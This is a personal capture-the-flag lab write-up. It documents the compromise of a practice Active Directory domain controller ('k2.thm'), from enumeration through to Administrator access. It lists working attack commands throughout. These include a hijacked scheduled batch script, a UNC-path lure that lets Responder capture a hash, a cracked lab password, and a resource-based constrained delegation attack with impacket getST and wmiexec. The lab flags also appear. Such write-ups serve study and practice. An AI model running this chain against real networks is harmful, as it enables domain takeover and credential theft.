---
Status: "#Finished"
OS:
ip:
Start_Time: 2026-02-24 15:49
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	Now Let's do the base three, which is the final one of this room.
	Following the scan result, I found that this is still an active directory.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
```

![](<assets/Pasted image 20260224155145.png>)
	The detailed scan gives us enough information about the target. Following the result, I found several potential furthur enumeration parts. 
	Let's first do a furthur enumeration. I will use enum4linux to do that.

```
enum4linux-ng -A 10.80.154.190
```

![](<assets/Pasted image 20260224160349.png>)
![](<assets/Pasted image 20260224160402.png>)
	For now, I decide to use kerbrute to enumerate the usernames first. 
	
![](<assets/Pasted image 20260224162918.png>)
	I found an admin usernames and tried the NTLM hashes from the base2 of the admin. And I failed, so let's try other users.

![](<assets/Pasted image 20260224163746.png>)
	Except the admin, j.smith is also availble. I tried the hashes from the base 2 and finally get one hash matches j.smith.

![](<assets/Pasted image 20260224164306.png>)
	
	
	
---

##  3. Initial access
	Following the result, I use evil-winrm to login as j.smith.
```
evil-winrm -i 10.80.154.190 -u 'j.smith' -H '9545b61858c043477c350ae86c37b32f'
```

![](<assets/Pasted image 20260224164746.png>)
	This is our intial access point. Now I want to use bloodhound to gather more information.
	I upload the SharpHound.exe and gather the information for analysis.

![](<assets/Pasted image 20260224170224.png>)
	We can directly escalated to admin through j.smith.  And I noticed there is another user called O.armstrong. So the possible escalation path is I first escalated to armstrong and then to the admin.

![](<assets/Pasted image 20260224170850.png>)
	
![](<assets/Pasted image 20260224170900.png>)
	Now let's check the j.smith's account.

![](<assets/Pasted image 20260224171725.png>)
	Smith has a SeMachineaccount privlege.
	And the machine we are in is the k2rootdc.

![](<assets/Pasted image 20260224173805.png>)
	
##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [x] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).
	I checked the C:\ directory and finds a file called backup.bat. And it is used to copy a txt file in armstrong's Desktop.

![](<assets/Pasted image 20260224175307.png>)
	However, I have a key finding that j.smith is belonged to remote management users group and can run command Get addomain.

![](<assets/Pasted image 20260224175712.png>)

![](<assets/Pasted image 20260224175727.png>)
	Also I found that J.smith has access to replication. 

![](<assets/Pasted image 20260224175904.png>)
	Here I get two critical information. 

![](<assets/Pasted image 20260224181105.png>)

![](<assets/Pasted image 20260224181119.png>)
	J.smith and O.armstrong are in the same domain local group.  I check the Sciprt directory and found that Armstrong and smith both has fully access to this directory, and there is a file called backup.bat.

![](<assets/Pasted image 20260224182141.png>)
	And I can delete the backup.bat file. So I delete it and substitute it with my backup.bat file.

![](<assets/Pasted image 20260224182446.png>)
	
```
type C:\Users\o.armstrong\Desktop\notes.txt > C:\Scripts\loot.txt
```
	I first want to check the content of the notes.txt. And then I get the output files. The content shows that this is highly possible a auto run script. May be I can use this to achieve remote code execution.

![](<assets/Pasted image 20260224183924.png>)
	Next, I used whoami to verify who run the script.
```
cmd /c "echo whoami ^> C:\Scripts\who.txt> C:\Scripts\backup.bat"
```

![](<assets/Pasted image 20260224200149.png>)
	The result is returned. The script is run as O.armstrong.

![](<assets/Pasted image 20260224200728.png>)
	By setting the script's content, I make sure that the script is running for every second.

```
Set-Content C:\Scripts\backup.bat 'echo %DATE% %TIME%>>C:\Scripts\hit.txt'
```

![](<assets/Pasted image 20260224202235.png>)

```
Set-Content C:\Scripts\backup.bat "powershell -Command `"whoami /all > C:\Scripts\arm_all.txt`""
```
	Using this script content, I verify armstrong's privlege.

![](<assets/Pasted image 20260224203536.png>)
	I noticed that there is a group called IT director. Also, by looking at the bloodhound, I found that armstrong may have DCsync or DCfor access. This means armstrong may be albe to run the related AD command.

```
Set-Content C:\Scripts\backup.bat "powershell -Command `"Get-ADDomain | Out-File C:\Scripts\domain.txt`""
```
	By setting the Script content to this, I want to verify this.

![](<assets/Pasted image 20260224204459.png>)
	This is the output. This verified that armstrong is able to run the ad command in powershell.
	And it can read the whole AD object.
	Let's test its DCsync access.

```
Set-Content C:\Scripts\backup.bat 'powershell -Command "repadmin /showrepl > C:\Scripts\repl.txt"'
```
	
![](<assets/Pasted image 20260224204747.png>)
	Well, it indeed has the access. The bloodhound reminds us that armstrong has DCfor and DCsync, so let's keep checking these two.

```
Set-Content C:\Scripts\backup.bat 'powershell -Command "Set-ADComputer K2ROOTDC -Description test; Get-ADComputer K2ROOTDC -Properties Description | Out-File C:\Scripts\dc_desc.txt"'
```

![](<assets/Pasted image 20260224210108.png>)
	Success. This means we can preform RBCD attack. Armstrong is able to modify the account.
	First, Let's create a new account. But let's first get armstrong's credential. 
	For now, We are able to use the script to run the command. So how about we preform a LLMNR or NBT-posion attack to get O.armstrong's  hash.

```
Set-Content C:\Scripts\backup.bat 'cmd /c dir \\IP\share'
```
	Then we start the responder.

![](<assets/Pasted image 20260224212401.png>)
	We have capture the hash.
	Next, I used hashcat to brute force it.

```
O.armstrong:arMStronG08
```
	This is the credential.
### 4.2 Escalation Path
	This time I login as O.armstrong.

![](<assets/Pasted image 20260224213011.png>)
	Now, let's preform RBCD attack.
	First, I will write the RBCD object here.

```
$Sid = (Get-ADUser o.armstrong).SID
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$Sid)"
$Bytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($Bytes,0)
Set-ADComputer K2ROOTDC -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$Bytes}
```

![](<assets/Pasted image 20260224213315.png>)
	Success. Now I will use impacket's getST to produce an admin cache.
	First, I need to create an account.

```
impacket-addcomputer -method SAMR -computer-name ATTACKERSYSTEM$ -computer-pass 'Password00!' -dc-ip 10.82.186.53 k2.thm/o.armstrong:'arMStronG08'
```

![](<assets/Pasted image 20260224215105.png>)
	Next, we need to write into the RBCD.

```
impacket-rbcd -dc-ip 10.82.186.53 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'K2RootDC$' k2.thm/o.armstrong:'arMStronG08'
```

![](<assets/Pasted image 20260224215205.png>)
	Next, we need to get access the admin cache.
```
impacket-getST -dc-ip 10.82.186.53 K2.THM/ATTACKERSYSTEM$:'Password00!' -spn HOST/K2RootDC.k2.thm -impersonate Administrator
```

![](<assets/Pasted image 20260224220126.png>)
	Next, we will use this to get the shell.

```
export KRB5CCNAME=$(ls *.ccache | head -n 1)
impacket-wmiexec -k -no-pass k2.thm/Administrator@K2RootDC.k2.thm
```

![](<assets/Pasted image 20260224220222.png>)
	Now we are admin.
	
---


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash)                   | Screenshot (Link)                           |
| :------------ | :------------------------------------ | :------------------------------------------ |
| **local.txt** | THM{400002b4b9fa7decb59019364388b8a3} | ![](<assets/Pasted image 20260224220448.png>) |
| **proof.txt** | THM{2000099729df1a4ec18bc0346d36b5ba} | ![](<assets/Pasted image 20260224220332.png>) |
